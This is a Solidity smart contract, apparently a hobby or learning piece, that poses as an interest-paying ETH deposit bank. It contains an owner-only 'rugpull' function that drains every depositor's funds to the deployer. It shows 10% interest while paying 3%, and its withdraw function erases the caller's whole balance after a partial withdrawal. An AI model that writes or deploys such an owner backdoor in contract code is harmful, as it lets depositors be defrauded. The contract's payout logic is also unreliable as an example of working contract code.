//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract bank_killer{

    address owner;               //declare the variable outside constructor so other func can access it
    constructor() {
        owner = msg.sender;      //assign the deployer's address to owner                        
    }

    //global state variables
    mapping (address=>uint) balance;    //mapping to link address and amount
    mapping (address=>uint) dep;        //mapping to link address and timestamp
    uint con_bal=0;                     //contract balance initialized                


    function add_eth() public payable{          //function to add eth to contract
        balance[msg.sender] += msg.value;       //update the balance of the sender; keeps updating for each txn
        dep[msg.sender] = block.timestamp;      //log the deposit timestamp for the sender
        con_bal += msg.value;                   //update the contract balance
    }

    function interest_check() view public returns(uint interest){               //function to calc interest for contributor
        uint rate=10;                                                           //rate of interest = 10% PA   
        uint principal = chk_principal(msg.sender);                             //check the principal for sender   
        uint time = uint (block.timestamp - dep[msg.sender])/(60*60*24*365);    //calc time elapsed since deposit
        interest = (principal*rate*time)/100;                                   //max possible interest calculated    
        return interest;
    }

    function interest_calc(uint data) view internal returns(uint){          //function to calculate the actual interest
       uint rate=3;                                                         //rate of interest
       uint time = uint (block.timestamp - dep[msg.sender])/(60*60*24*365); //calc time interval
       uint act_int = (data*rate*time)/100;                                 //calc actual interest accumulated
       return act_int;
    }

    function chk_principal(address _address) view public returns(uint){    //function to check deposit amount of individuals
        return balance[_address];
    }

    function withdraw(uint _amt) public payable{                    //function to withdraw amount from contract
        address payable receiver = payable (msg.sender);            //assign the address of message sender to receiver
        uint deposited_bal = balance[msg.sender];                   //this is the max amount deposited by func caller                                            
        uint max_amt = deposited_bal + interest_check();            //max amount that can be withdrawn (includes interest)
        uint send = _amt + interest_calc(_amt);                     //this is the amount to be transfered
        require(send<=max_amt, "Not enough ETH");                   //check to ensure the other's funds are not withdrawn
        receiver.transfer(send);                                    //perform the transfer process to the caller
        con_bal-=send;                                              //update the contract balance
        balance[msg.sender] -= deposited_bal;                       //update the caller's balance                 
    }

    function rugpull() public payable{                              //function to withdraw all the funds in the contract
        require(msg.sender == owner, "Cannot do this");             //check to allow only the owner to withdraw    
        payable (msg.sender).transfer(con_bal);                     //transfer the contract balance to ownner 
        con_bal=0;                                                  //update the contract balance to 0
    }

    function see_contract_bal() view public returns(uint){          //function to view contract balance
        return con_bal;
    }
}
